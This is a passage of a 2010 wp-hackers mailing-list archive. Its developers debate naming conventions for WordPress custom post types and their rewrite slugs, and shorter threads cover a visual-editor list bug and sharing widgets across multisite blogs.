> One idea for the core WP side is to have all the post types
> proceeded with wp_ and make this reserves for all core post types
> to that plugin authors cannot register anything beginning with
> 'wp_'.
>

Although I totally agree with the reasoning, this is likely to cause a 
few plugins with custom queries to stop working. So the change would 
have to cover both, for example, wp_posts & posts for several releases.

Rich


From mikeschinkel at newclarity.net  Sat Jul 10 23:59:24 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Sat, 10 Jul 2010 19:59:24 -0400
Subject: [wp-hackers] Custom Post Types and pending incompatibilities
In-Reply-To: <7A285335-C7F7-49C1-B9CF-D8D1473FB587@codehooligans.com>
References: <2C188E6F-273E-4758-901A-C99AFA575BD4@newclarity.net>
	<7A285335-C7F7-49C1-B9CF-D8D1473FB587@codehooligans.com>
Message-ID: <8237C753-4CD6-47FF-AEB4-B2F03B30697E@newclarity.net>

On Jul 10, 2010, at 5:51 PM, Paul wrote:
> Personally I can't say I like the idea of theses solutions. Having a codex page or central site where you need to somehow register your post type name just seems wrong to me. Too many extra steps to just through. 

Not sure what others are thinking but my proposal was to offer an opt-in for those who proactively want to collaborate, not a requirement for those who do not.  

> One idea for the core WP side is to have all the post types proceeded with wp_ and make this reserves for all core post types to that plugin authors cannot register anything beginning with 'wp_'.

Any reason not to just go with an underscore prefix?  

> I agree with your thought here but don't really see a way to control this. It sort of goes against the openness of the WordPress plugin architecture. Consider how many Event/Calendar plugins are currently on WordPress.org (dozens). Some are great and do 75% of what I need. Others not so much. Even without the new custom post type functionality can you see a way to tell these plugin authors "Hey, if you plan to develop an Event/Calendar plugin it must meet this list of function and custom field requirements.". Again, I say it goes against the openness of the infrastructure which makes WordPress what it is.

That's not what I was suggesting. There's no need to control anything; this was more about enabling those who do want to collaborate.

> Nor do I like the thought that via a community there will be a combined effort to develop a single kick-ass Event/Calendar plugin. Because my needs for an Events plugin are not the same as your or others. I like having dozens of choices. 

I wasn't proposing a "plugin to rule them all"; no, much simpler than that.  I was proposing collaboration on post type and custom field naming, and possibly some shared classes and functions.

If five people want to each build event plugins wouldn't be be great if they all settled on the same way to store the basic subset of information they all needed about events like naming of the custom fields for the date, venue, etc?  That way there would be a great likelihood of there being compatibility.

It would be similar to the discussion of geo data on the list last month that pretty much everyone gave a +1 too. Rather than have one plugin store in a "latlong" custom field and another in "geo_lat" and "geo_long", better to get proactive people talking so they can use a common custom field name so as to avoid the arbitrarily incompatible naming.

> A bigger question is who decided what warrant putting these working groups together?

My suggestion was to set a number of people required to be interested and if enough people are interested then they would get a working group.  And "working group" could be too strong a name, maybe it's just a BBPress forum (or a wp-whatever mailing list.)  

But there easily could be other approaches; I just proposed one as a starting point.

>> 2.) Give people a place on WordPress.org to propose new working groups and if they collect enough "+1s" (10 people or more? 25? 100?) then they get their working group.
> The 'Digg' effect. Personally I don't see it working for any of my client sites. Sorry. 

I am confused about why it would need to "work" for your client sites.  This is about a way for the people in the community who are building plugins to work together for mutual benefit, not about clients who typically could care little about the technical and organizational aspects of WordPress.  

So you have me completely confused on this; mind if I ask for elaboration?

>> 3.) Recommend that all values used for post_type in the wp_posts table be either singular or plural (my strong preference is singular but will go with whatever the consensus is) except for in use-cases where the rule would obviously not apply. And recommend that they use dashes or underscores for post type names, one or the other.
> 
> Yeah, but you are talking about the first parameter to the register_post_type function which is different than the labels. I can register an Events custom type as 'THX1138'. The post type 'key' really is insignificant except it needs to be unique for my post type needs.

The post key is insignificant until someone wants to run two plugins that do different things but use the same "key."  Or until you as a developer creates a custom post type with the same "key" that is identical to the key used by a plugin developer for a plugin your client wants to use. Point of note, the conflicts are going to happen, there's little if anything I could suggest that would keep all instances of post type keys from conflicting, mine what more about helping those who want to be helped.

Post keys are a global namespace, and global namespaces will always have conflicts. Having approaches to minimize those conflicts would be nice. 

> Personally, I worry about having this action in the init process. Why is it required to register a post type for every page load? Why is this not done once like when a plugin is activated? But I digress. 

Yes, you digress. :)

> Again my comment from above. Underscore works but why not 'wp_' like most of the functions in core. 

Two more chars to type and to store per record in the database?  But either one would address the issue.

On Jul 10, 2010, at 7:08 PM, Rich Pedley wrote:
>> One idea for the core WP side is to have all the post types
>> proceeded with wp_ and make this reserves for all core post types
>> to that plugin authors cannot register anything beginning with
>> 'wp_'.
> 
> Although I totally agree with the reasoning, this is likely to cause a few plugins with custom queries to stop working. So the change would have to cover both, for example, wp_posts & posts for several releases.


Clearly.  Hence I understand how problematic it would be to do this with posts, pages, revisions and attachments and maybe even for nav_menu_items.  But for future ones...

>> Not sure how to get that "best practice" out there so that it
>> becomes widely know?
> 
> Well adding it to:
> http://codex.wordpress.org/Custom_Post_Types


Yes, I guess that would be a start although it wouldn't necessarily address all the articles written about it. I guess I/we could comment on those posts in hopes that readers will read all the comments and/or the author will update the post.  But, at least for me it would seem premature because AFAIK there's not a reasonably agreed approach yet, or is there?

Would "myplug:event" be an appropriate prefix, or should it be "myplugin-event" or "myplugin_event?"  Which begs the question; is there a defined set of valid characters for a post type or is it defined by what works (and what doesn't, if any?)

-Mike

From paul at codehooligans.com  Sun Jul 11 00:06:12 2010
From: paul at codehooligans.com (Paul)
Date: Sat, 10 Jul 2010 20:06:12 -0400
Subject: [wp-hackers] Custom Post Types and pending incompatibilities
In-Reply-To: <4C38FD88.4030501@elfden.co.uk>
References: <2C188E6F-273E-4758-901A-C99AFA575BD4@newclarity.net>
	<7A285335-C7F7-49C1-B9CF-D8D1473FB587@codehooligans.com>
	<4C38FD88.4030501@elfden.co.uk>
Message-ID: <BFB56E1E-780A-42AB-AEEF-495E9AC0A6A2@codehooligans.com>

Well according to the register_taxonomy Codex page there is already a list of reserved taxonomies. So really not seeing how this could not be implemented also for post types. http://codex.wordpress.org/Function_Reference/register_taxonomy

One slight issue with my suggestion is the existing (new) logic to handle actions and templates where the post type name is used as part of the template like single-event.php etc. 
P-




On Jul 10, 2010, at 7:08 PM, Rich Pedley wrote:

> On 10/07/2010 22:51, Paul wrote:
>> Personally I can't say I like the idea of theses solutions. Having
>> a codex page or central site where you need to somehow register
>> your post type name just seems wrong to me. Too many extra steps to
>> just through.
>> 
>>> -- Most importantly, it will likely be impossible to add any new
>>> types to core w/o potentially breaking existing plugins and/or
>>> existing custom implementations.
>> 
>> One idea for the core WP side is to have all the post types
>> proceeded with wp_ and make this reserves for all core post types
>> to that plugin authors cannot register anything beginning with
>> 'wp_'.
>> 
> 
> Although I totally agree with the reasoning, this is likely to cause a few plugins with custom queries to stop working. So the change would have to cover both, for example, wp_posts & posts for several releases.
> 
> Rich
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From paul at codehooligans.com  Sun Jul 11 00:48:52 2010
From: paul at codehooligans.com (Paul)
Date: Sat, 10 Jul 2010 20:48:52 -0400
Subject: [wp-hackers] Custom Post Types and pending incompatibilities
In-Reply-To: <8237C753-4CD6-47FF-AEB4-B2F03B30697E@newclarity.net>
References: <2C188E6F-273E-4758-901A-C99AFA575BD4@newclarity.net>
	<7A285335-C7F7-49C1-B9CF-D8D1473FB587@codehooligans.com>
	<8237C753-4CD6-47FF-AEB4-B2F03B30697E@newclarity.net>
Message-ID: <E8A1C4EE-272D-472E-A24C-6F631D8A57A1@codehooligans.com>

Mike,

Just ignore most of my comment. Most were apparently just misinterpretations of your comments. Just need to learnt o keep my thought to myself. 

Thanks,

Paul

On Jul 10, 2010, at 7:59 PM, Mike Schinkel wrote:

> On Jul 10, 2010, at 5:51 PM, Paul wrote:
>> Personally I can't say I like the idea of theses solutions. Having a codex page or central site where you need to somehow register your post type name just seems wrong to me. Too many extra steps to just through. 
> 
> Not sure what others are thinking but my proposal was to offer an opt-in for those who proactively want to collaborate, not a requirement for those who do not.  
> 
>> One idea for the core WP side is to have all the post types proceeded with wp_ and make this reserves for all core post types to that plugin authors cannot register anything beginning with 'wp_'.
> 
> Any reason not to just go with an underscore prefix?  
> 
>> I agree with your thought here but don't really see a way to control this. It sort of goes against the openness of the WordPress plugin architecture. Consider how many Event/Calendar plugins are currently on WordPress.org (dozens). Some are great and do 75% of what I need. Others not so much. Even without the new custom post type functionality can you see a way to tell these plugin authors "Hey, if you plan to develop an Event/Calendar plugin it must meet this list of function and custom field requirements.". Again, I say it goes against the openness of the infrastructure which makes WordPress what it is.
> 
> That's not what I was suggesting. There's no need to control anything; this was more about enabling those who do want to collaborate.
> 
>> Nor do I like the thought that via a community there will be a combined effort to develop a single kick-ass Event/Calendar plugin. Because my needs for an Events plugin are not the same as your or others. I like having dozens of choices. 
> 
> I wasn't proposing a "plugin to rule them all"; no, much simpler than that.  I was proposing collaboration on post type and custom field naming, and possibly some shared classes and functions.
> 
> If five people want to each build event plugins wouldn't be be great if they all settled on the same way to store the basic subset of information they all needed about events like naming of the custom fields for the date, venue, etc?  That way there would be a great likelihood of there being compatibility.
> 
> It would be similar to the discussion of geo data on the list last month that pretty much everyone gave a +1 too. Rather than have one plugin store in a "latlong" custom field and another in "geo_lat" and "geo_long", better to get proactive people talking so they can use a common custom field name so as to avoid the arbitrarily incompatible naming.
> 
>> A bigger question is who decided what warrant putting these working groups together?
> 
> My suggestion was to set a number of people required to be interested and if enough people are interested then they would get a working group.  And "working group" could be too strong a name, maybe it's just a BBPress forum (or a wp-whatever mailing list.)  
> 
> But there easily could be other approaches; I just proposed one as a starting point.
> 
>>> 2.) Give people a place on WordPress.org to propose new working groups and if they collect enough "+1s" (10 people or more? 25? 100?) then they get their working group.
>> The 'Digg' effect. Personally I don't see it working for any of my client sites. Sorry. 
> 
> I am confused about why it would need to "work" for your client sites.  This is about a way for the people in the community who are building plugins to work together for mutual benefit, not about clients who typically could care little about the technical and organizational aspects of WordPress.  
> 
> So you have me completely confused on this; mind if I ask for elaboration?
> 
>>> 3.) Recommend that all values used for post_type in the wp_posts table be either singular or plural (my strong preference is singular but will go with whatever the consensus is) except for in use-cases where the rule would obviously not apply. And recommend that they use dashes or underscores for post type names, one or the other.
>> 
>> Yeah, but you are talking about the first parameter to the register_post_type function which is different than the labels. I can register an Events custom type as 'THX1138'. The post type 'key' really is insignificant except it needs to be unique for my post type needs.
> 
> The post key is insignificant until someone wants to run two plugins that do different things but use the same "key."  Or until you as a developer creates a custom post type with the same "key" that is identical to the key used by a plugin developer for a plugin your client wants to use. Point of note, the conflicts are going to happen, there's little if anything I could suggest that would keep all instances of post type keys from conflicting, mine what more about helping those who want to be helped.
> 
> Post keys are a global namespace, and global namespaces will always have conflicts. Having approaches to minimize those conflicts would be nice. 
> 
>> Personally, I worry about having this action in the init process. Why is it required to register a post type for every page load? Why is this not done once like when a plugin is activated? But I digress. 
> 
> Yes, you digress. :)
> 
>> Again my comment from above. Underscore works but why not 'wp_' like most of the functions in core. 
> 
> Two more chars to type and to store per record in the database?  But either one would address the issue.
> 
> On Jul 10, 2010, at 7:08 PM, Rich Pedley wrote:
>>> One idea for the core WP side is to have all the post types
>>> proceeded with wp_ and make this reserves for all core post types
>>> to that plugin authors cannot register anything beginning with
>>> 'wp_'.
>> 
>> Although I totally agree with the reasoning, this is likely to cause a few plugins with custom queries to stop working. So the change would have to cover both, for example, wp_posts & posts for several releases.
> 
> 
> Clearly.  Hence I understand how problematic it would be to do this with posts, pages, revisions and attachments and maybe even for nav_menu_items.  But for future ones...
> 
>>> Not sure how to get that "best practice" out there so that it
>>> becomes widely know?
>> 
>> Well adding it to:
>> http://codex.wordpress.org/Custom_Post_Types
> 
> 
> Yes, I guess that would be a start although it wouldn't necessarily address all the articles written about it. I guess I/we could comment on those posts in hopes that readers will read all the comments and/or the author will update the post.  But, at least for me it would seem premature because AFAIK there's not a reasonably agreed approach yet, or is there?
> 
> Would "myplug:event" be an appropriate prefix, or should it be "myplugin-event" or "myplugin_event?"  Which begs the question; is there a defined set of valid characters for a post type or is it defined by what works (and what doesn't, if any?)
> 
> -Mike
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From johnbillion+wp at gmail.com  Sun Jul 11 00:55:48 2010
From: johnbillion+wp at gmail.com (John Blackbourn)
Date: Sun, 11 Jul 2010 01:55:48 +0100
Subject: [wp-hackers] Visual Editor is breaking lists
In-Reply-To: <AANLkTil3L46pHVVcx-G_xR3ClQbDnmJqCvaxLBG7XZuS@mail.gmail.com>
References: <AANLkTil3L46pHVVcx-G_xR3ClQbDnmJqCvaxLBG7XZuS@mail.gmail.com>
Message-ID: <AANLkTiks4tLhGpoITWhB_q1KoJfu8hp4EQSNY0TIC-kL@mail.gmail.com>

On Sat, Jul 10, 2010 at 7:44 PM, Arlen Beiler <arlenbee at gmail.com> wrote:
> Why is the Visual Editor always breaking my lists?

Arlen, please. A post like this serves no purpose. If you want anyone
to answer you're going to have to give us some details.

From arlenbee at gmail.com  Sun Jul 11 01:40:52 2010
From: arlenbee at gmail.com (Arlen Beiler)
Date: Sat, 10 Jul 2010 21:40:52 -0400
Subject: [wp-hackers] Visual Editor is breaking lists
In-Reply-To: <AANLkTiks4tLhGpoITWhB_q1KoJfu8hp4EQSNY0TIC-kL@mail.gmail.com>
References: <AANLkTil3L46pHVVcx-G_xR3ClQbDnmJqCvaxLBG7XZuS@mail.gmail.com> 
	<AANLkTiks4tLhGpoITWhB_q1KoJfu8hp4EQSNY0TIC-kL@mail.gmail.com>
Message-ID: <AANLkTilSvt0Lf-NHeFBhEXg25XBEQvWH-zk-fBJCSNTO@mail.gmail.com>

Opened up a ticket (http://core.trac.wordpress.org/ticket/14270) and so far
figured out it is a chrome issue.

On Sat, Jul 10, 2010 at 8:55 PM, John Blackbourn
<johnbillion+wp at gmail.com<johnbillion%2Bwp at gmail.com>
> wrote:

> On Sat, Jul 10, 2010 at 7:44 PM, Arlen Beiler <arlenbee at gmail.com> wrote:
> > Why is the Visual Editor always breaking my lists?
>
> Arlen, please. A post like this serves no purpose. If you want anyone
> to answer you're going to have to give us some details.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From jdub at bethesignal.org  Sun Jul 11 03:39:30 2010
From: jdub at bethesignal.org (Jeff Waugh)
Date: Sun, 11 Jul 2010 13:39:30 +1000
Subject: [wp-hackers] Custom Post Types and pending incompatibilities
In-Reply-To: <AANLkTikBu-9wNO1Yw1RL1ndJ3OLL8sP78vGV_YzSO87_@mail.gmail.com>
References: <2C188E6F-273E-4758-901A-C99AFA575BD4@newclarity.net>
	<AANLkTikBu-9wNO1Yw1RL1ndJ3OLL8sP78vGV_YzSO87_@mail.gmail.com>
Message-ID: <20100711033930.GA1955@waugh.id.au>

<quote who="Otto">

> One would hope that plugins would use a prefix naming convention for their
> custom types in the same way we recommend making function names and such.
> plugin_whatever and so forth.

Concur, that's an easy and unsurprising way for plugin authors to do things.
Perhaps we should even encourage it in the docs?

Slightly different challenge: It's incredibly unlikely that plugin authors
would want the rewrite root of their custom post type URLs to be namespaced
in such an ugly way (in public URLs that is -- in code it's fiiiine).

Consider: A "jdub_bongsip" custom type vs. /jdub_bongsip/%slug%/ URLs. Ick!

Not sure what we should encourage in that case. Perhaps automagically create
a setting on the Permalinks page for custom post types (which don't define
this manually themselves) similar to the tag and category URL root settings?

Tough one.

- Jeff

-- 
Ubuntu's Bleeding Edge                      http://ubuntuedge.wordpress.com/
 
   "It's a pan-dimensional cake, and there are many ways to slice it." -
                                Bruce Badger

From bulk at thecodecave.com  Sun Jul 11 03:57:55 2010
From: bulk at thecodecave.com (Brian Layman)
Date: Sat, 10 Jul 2010 23:57:55 -0400
Subject: [wp-hackers] Custom Post Types and pending incompatibilities
In-Reply-To: <8237C753-4CD6-47FF-AEB4-B2F03B30697E@newclarity.net>
References: <2C188E6F-273E-4758-901A-C99AFA575BD4@newclarity.net>	<7A285335-C7F7-49C1-B9CF-D8D1473FB587@codehooligans.com>
	<8237C753-4CD6-47FF-AEB4-B2F03B30697E@newclarity.net>
Message-ID: <004f01cb20ad$427c1410$c7743c30$@com>

>> One idea for the core WP side is to have all the post types proceeded
with wp_ 
> Any reason not to just go with an underscore prefix?  

The underscore prefix is typically used in WordPress to signal something
hidden to the UI (options & post_meta for instance). Following this
paradigm, I have written plugins that use an underscore to signal a hidden
taxonomy. The specific need was to create custom RSS feeds and triggers
while not cluttering the UI. I would suspect that I am not the only one to
do this.

______________________________________________
Brian Layman
eHermits, Inc.


From mikeschinkel at newclarity.net  Sun Jul 11 05:27:41 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Sun, 11 Jul 2010 01:27:41 -0400
Subject: [wp-hackers] Custom Post Types and pending incompatibilities
In-Reply-To: <20100711033930.GA1955@waugh.id.au>
References: <2C188E6F-273E-4758-901A-C99AFA575BD4@newclarity.net>
	<AANLkTikBu-9wNO1Yw1RL1ndJ3OLL8sP78vGV_YzSO87_@mail.gmail.com>
	<20100711033930.GA1955@waugh.id.au>
Message-ID: <6F19AA0F-0E8D-4AB3-87D3-2AC2A6010B78@newclarity.net>

On Jul 10, 2010, at 11:39 PM, Jeff Waugh wrote:
> Slightly different challenge: It's incredibly unlikely that plugin authors
> would want the rewrite root of their custom post type URLs to be namespaced
> in such an ugly way (in public URLs that is -- in code it's fiiiine).
> 
> Consider: A "jdub_bongsip" custom type vs. /jdub_bongsip/%slug%/ URLs. Ick!
> 
> Not sure what we should encourage in that case. Perhaps automagically create
> a setting on the Permalinks page for custom post types (which don't define
> this manually themselves) similar to the tag and category URL root settings?
> 
> Tough one.

Really good point.   I can think of no solution for it, either.  Anyone?

On Jul 10, 2010, at 11:57 PM, Brian Layman wrote:
>>> One idea for the core WP side is to have all the post types proceeded
>>> with wp_ 
>> Any reason not to just go with an underscore prefix?  
> 
> The underscore prefix is typically used in WordPress to signal something
> hidden to the UI (options & post_meta for instance). Following this
> paradigm, I have written plugins that use an underscore to signal a hidden
> taxonomy. The specific need was to create custom RSS feeds and triggers
> while not cluttering the UI. I would suspect that I am not the only one to
> do this.

Makes complete sense.  So maybe future core and core plugin post type would be "wp_" prefixed?  Thoughts from anyone on the core team?  (Personally I admit I like the simple elegance of names like "post" and "event" etc. but I worry about compatibility issues stunting growth in effective functionality made available.)

-Mike

From otto at ottodestruct.com  Sun Jul 11 06:09:43 2010
From: otto at ottodestruct.com (Otto)
Date: Sun, 11 Jul 2010 01:09:43 -0500
Subject: [wp-hackers] Custom Post Types and pending incompatibilities
In-Reply-To: <20100711033930.GA1955@waugh.id.au>
References: <2C188E6F-273E-4758-901A-C99AFA575BD4@newclarity.net> 
	<AANLkTikBu-9wNO1Yw1RL1ndJ3OLL8sP78vGV_YzSO87_@mail.gmail.com> 
	<20100711033930.GA1955@waugh.id.au>
Message-ID: <AANLkTimIvlGTy1sv0C6d3YL2yNQmoreatDHImAYscwjN@mail.gmail.com>

On Sat, Jul 10, 2010 at 10:39 PM, Jeff Waugh <jdub at bethesignal.org> wrote:
> Slightly different challenge: It's incredibly unlikely that plugin authors
> would want the rewrite root of their custom post type URLs to be namespaced
> in such an ugly way (in public URLs that is -- in code it's fiiiine).

They don't have to be connected, they just default that way. The
register_post_type function takes a rewrite attribute you can use to
override that.

register_post_type ('plugin_whatever', array(
...
'rewrite' => array("slug" => "whatever")
...
));


http://codex.wordpress.org/Function_Reference/register_post_type

-Otto

From jdub at bethesignal.org  Sun Jul 11 06:21:38 2010
From: jdub at bethesignal.org (Jeff Waugh)
Date: Sun, 11 Jul 2010 16:21:38 +1000
Subject: [wp-hackers] Custom Post Types and pending incompatibilities
In-Reply-To: <AANLkTimIvlGTy1sv0C6d3YL2yNQmoreatDHImAYscwjN@mail.gmail.com>
References: <2C188E6F-273E-4758-901A-C99AFA575BD4@newclarity.net>
	<AANLkTikBu-9wNO1Yw1RL1ndJ3OLL8sP78vGV_YzSO87_@mail.gmail.com>
	<20100711033930.GA1955@waugh.id.au>
	<AANLkTimIvlGTy1sv0C6d3YL2yNQmoreatDHImAYscwjN@mail.gmail.com>
Message-ID: <20100711062138.GB1955@waugh.id.au>

<quote who="Otto">

> On Sat, Jul 10, 2010 at 10:39 PM, Jeff Waugh <jdub at bethesignal.org> wrote:
> > Slightly different challenge: It's incredibly unlikely that plugin
> > authors would want the rewrite root of their custom post type URLs to be
> > namespaced in such an ugly way (in public URLs that is -- in code it's
> > fiiiine).
> 
> They don't have to be connected, they just default that way. The
> register_post_type function takes a rewrite attribute you can use to
> override that.
> 
> register_post_type ('plugin_whatever', array(
> ...
> 'rewrite' => array("slug" => "whatever")
> ...
> ));

Yeah... for my "clamour" custom post_type, I've set that to "link" because
that's what looks good as part of the URL. That's obviously unsustainable,
because someone else will surely want to use that at some point. It's very
close to the same problem, just harder to solve.

- Jeff

-- 
Ubuntu's Bleeding Edge                      http://ubuntuedge.wordpress.com/
 
       "Wake up and smell the coffin." - Frank Costello, The Departed

From dvmorris at gmail.com  Sun Jul 11 16:56:19 2010
From: dvmorris at gmail.com (David Morris)
Date: Sun, 11 Jul 2010 11:56:19 -0500
Subject: [wp-hackers] Sharing widgets across multiple blogs
Message-ID: <AANLkTinseqLeTlp1AwDW_43697cfjCKmkYg_DuO2ORid@mail.gmail.com>

Is there a way to share sidebar widgets across multiple blogs in WordPress
3.0?

Assuming it would be easiest to do with blogs that are on the same network,
I'm looking for a way to have the option of sharing one blog's widgets with
all of other blogs, without having to modify core WP source code. Currently,
I either have to modify core source code or tell the blog administrators to
recreate the widgets across every blog on the network.

Thanks for your help,

-- 
Dave Morris
http://dave.showviz.net/
http://3dcamphouston.com/

From scribu at gmail.com  Sun Jul 11 17:00:08 2010
From: scribu at gmail.com (scribu)
Date: Sun, 11 Jul 2010 20:00:08 +0300
Subject: [wp-hackers] Sharing widgets across multiple blogs
In-Reply-To: <AANLkTinseqLeTlp1AwDW_43697cfjCKmkYg_DuO2ORid@mail.gmail.com>
References: <AANLkTinseqLeTlp1AwDW_43697cfjCKmkYg_DuO2ORid@mail.gmail.com>
Message-ID: <AANLkTinSP6rTIhok3cSfV105MuHDFEAIadpvzxe-Hxfj@mail.gmail.com>

On Sun, Jul 11, 2010 at 7:56 PM, David Morris <dvmorris at gmail.com> wrote:

> Is there a way to share sidebar widgets across multiple blogs in WordPress
> 3.0?
>

Just do this:

switch_to_blog(X); // X is the id of the master blog
// display sidebar
restore_current_blog();


-- 
http://scribu.net

From bulk at thecodecave.com  Sun Jul 11 17:04:49 2010
From: bulk at thecodecave.com (Brian Layman)
Date: Sun, 11 Jul 2010 13:04:49 -0400
Subject: [wp-hackers] Custom Post Types and pending incompatibilities
In-Reply-To: <AANLkTimIvlGTy1sv0C6d3YL2yNQmoreatDHImAYscwjN@mail.gmail.com>
References: <2C188E6F-273E-4758-901A-C99AFA575BD4@newclarity.net>
	<AANLkTikBu-9wNO1Yw1RL1ndJ3OLL8sP78vGV_YzSO87_@mail.gmail.com>
	<20100711033930.GA1955@waugh.id.au>
	<AANLkTimIvlGTy1sv0C6d3YL2yNQmoreatDHImAYscwjN@mail.gmail.com>
Message-ID: <004f01cb211b$2e0f9d80$8a2ed880$@com>

>They don't have to be connected, they just default that way.
I was thinking the same thing, but that just means that we can have two
collision sources. Slugs and names.

______________________________________________
Brian Layman
eHermits, Inc.


From mikeschinkel at newclarity.net  Sun Jul 11 22:57:22 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Sun, 11 Jul 2010 18:57:22 -0400
Subject: [wp-hackers] Custom Post Types and pending incompatibilities
In-Reply-To: <4C38FCCC.8030507@elfden.co.uk>
References: <2C188E6F-273E-4758-901A-C99AFA575BD4@newclarity.net>	<AANLkTikBu-9wNO1Yw1RL1ndJ3OLL8sP78vGV_YzSO87_@mail.gmail.com>
	<20971828-3EDF-4B53-BECE-0865CA1D33AB@newclarity.net>
	<4C38FCCC.8030507@elfden.co.uk>
Message-ID: <A1EF136C-C09C-405A-9117-CBE9CE478E4D@newclarity.net>

On Jul 10, 2010, at 7:05 PM, Rich Pedley wrote:
>> Not sure how to get that "best practice" out there so that it
>> becomes widely know?
> 
> Well adding it to:
> http://codex.wordpress.org/Custom_Post_Types
> 
> and changing the example to use a prefix would be a start.

Okay so I took a first stab at this. I had to set some stakes in the ground but if there are any that people disagree with then by all means please discuss:

	http://codex.wordpress.org/Custom_Post_Types#Custom_Types

-Mike

P.S. Also note that I wrote the following about "Reserved Post Type Names" which needs to (eventually?) be finalized by the core team:

Reserved Post Type Names
======================
Although the core development team has yet to make a final decision on this, it has been proposed on the wp-hackers list that future core post type names will be namespaced with "wp_", i.e. if the core team decides to add an "Event" post type then according to this suggestion they would use the internal name "wp_event." Even though this hasn't been finalized, it'll be a good idea to avoid any custom post types whose name begins with "wp_."



From scribu at gmail.com  Sun Jul 11 23:13:19 2010
From: scribu at gmail.com (scribu)
Date: Mon, 12 Jul 2010 02:13:19 +0300
Subject: [wp-hackers] Custom Post Types and pending incompatibilities
In-Reply-To: <A1EF136C-C09C-405A-9117-CBE9CE478E4D@newclarity.net>
References: <2C188E6F-273E-4758-901A-C99AFA575BD4@newclarity.net>
	<AANLkTikBu-9wNO1Yw1RL1ndJ3OLL8sP78vGV_YzSO87_@mail.gmail.com>
	<20971828-3EDF-4B53-BECE-0865CA1D33AB@newclarity.net>
	<4C38FCCC.8030507@elfden.co.uk>
	<A1EF136C-C09C-405A-9117-CBE9CE478E4D@newclarity.net>
Message-ID: <AANLkTimPM0LcrizM7LOMtpADmYADfxHBsqhrng50njQ8@mail.gmail.com>

On Mon, Jul 12, 2010 at 1:57 AM, Mike Schinkel
<mikeschinkel at newclarity.net>wrote:

> Reserved Post Type Names
> ======================
> Although the core development team has yet to make a final decision on
> this, it has been proposed on the wp-hackers list that future core post type
> names will be namespaced with "wp_", i.e. if the core team decides to add an
> "Event" post type then according to this suggestion they would use the
> internal name "wp_event." Even though this hasn't been finalized, it'll be a
> good idea to avoid any custom post types whose name begins with "wp_."
>

IMO, prefixing built-in post types with 'wp_' is not the way to go. We don't
prefix built-in option names either, nor built-in meta keys.


-- 
http://scribu.net

From scribu at gmail.com  Sun Jul 11 23:16:32 2010
From: scribu at gmail.com (scribu)
Date: Mon, 12 Jul 2010 02:16:32 +0300
Subject: [wp-hackers] Custom Post Types and pending incompatibilities
In-Reply-To: <AANLkTimPM0LcrizM7LOMtpADmYADfxHBsqhrng50njQ8@mail.gmail.com>
References: <2C188E6F-273E-4758-901A-C99AFA575BD4@newclarity.net>
	<AANLkTikBu-9wNO1Yw1RL1ndJ3OLL8sP78vGV_YzSO87_@mail.gmail.com>
	<20971828-3EDF-4B53-BECE-0865CA1D33AB@newclarity.net>
	<4C38FCCC.8030507@elfden.co.uk>
	<A1EF136C-C09C-405A-9117-CBE9CE478E4D@newclarity.net>
	<AANLkTimPM0LcrizM7LOMtpADmYADfxHBsqhrng50njQ8@mail.gmail.com>
Message-ID: <AANLkTimXUs4_Jo1PJNWJiMofk7NKuX4aPycMC1GeTvlZ@mail.gmail.com>

Furthermore, since 'post' and 'page' aren't going anywhere, if the core team
were to add a post type for events, calling it 'wp_event' would just be
confusing.


-- 
http://scribu.net

From mikeschinkel at newclarity.net  Sun Jul 11 23:26:38 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Sun, 11 Jul 2010 19:26:38 -0400
Subject: [wp-hackers] Custom Post Types and pending incompatibilities
In-Reply-To: <AANLkTimXUs4_Jo1PJNWJiMofk7NKuX4aPycMC1GeTvlZ@mail.gmail.com>
References: <2C188E6F-273E-4758-901A-C99AFA575BD4@newclarity.net>
	<AANLkTikBu-9wNO1Yw1RL1ndJ3OLL8sP78vGV_YzSO87_@mail.gmail.com>
	<20971828-3EDF-4B53-BECE-0865CA1D33AB@newclarity.net>
	<4C38FCCC.8030507@elfden.co.uk>
	<A1EF136C-C09C-405A-9117-CBE9CE478E4D@newclarity.net>
	<AANLkTimPM0LcrizM7LOMtpADmYADfxHBsqhrng50njQ8@mail.gmail.com>
	<AANLkTimXUs4_Jo1PJNWJiMofk7NKuX4aPycMC1GeTvlZ@mail.gmail.com>
Message-ID: <9C590CD4-A84A-45D0-BB33-74D2BA859F12@newclarity.net>

Any suggestion on how to avoid a situation of having a core update that adds a new post type keep from breaking any sites, themes and plugins that happen to use the same obvious name?  

Maybe the answer is, "Let it happen."  Okay if so, just thinking it would be nice for it to be explicit as opposed to by happenstance.

-Mike

On Jul 11, 2010, at 7:16 PM, scribu wrote:

> Furthermore, since 'post' and 'page' aren't going anywhere, if the core team
> were to add a post type for events, calling it 'wp_event' would just be
> confusing.
> 
> 
> -- 
> http://scribu.net
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From tobias at lecoqi.se  Sun Jul 11 23:37:07 2010
From: tobias at lecoqi.se (Tobias Bergius)
Date: Mon, 12 Jul 2010 01:37:07 +0200
Subject: [wp-hackers] Custom Post Types and pending incompatibilities
In-Reply-To: <9C590CD4-A84A-45D0-BB33-74D2BA859F12@newclarity.net>
References: <2C188E6F-273E-4758-901A-C99AFA575BD4@newclarity.net>
	<AANLkTikBu-9wNO1Yw1RL1ndJ3OLL8sP78vGV_YzSO87_@mail.gmail.com>
	<20971828-3EDF-4B53-BECE-0865CA1D33AB@newclarity.net>
	<4C38FCCC.8030507@elfden.co.uk>
	<A1EF136C-C09C-405A-9117-CBE9CE478E4D@newclarity.net>
	<AANLkTimPM0LcrizM7LOMtpADmYADfxHBsqhrng50njQ8@mail.gmail.com>
	<AANLkTimXUs4_Jo1PJNWJiMofk7NKuX4aPycMC1GeTvlZ@mail.gmail.com>
	<9C590CD4-A84A-45D0-BB33-74D2BA859F12@newclarity.net>
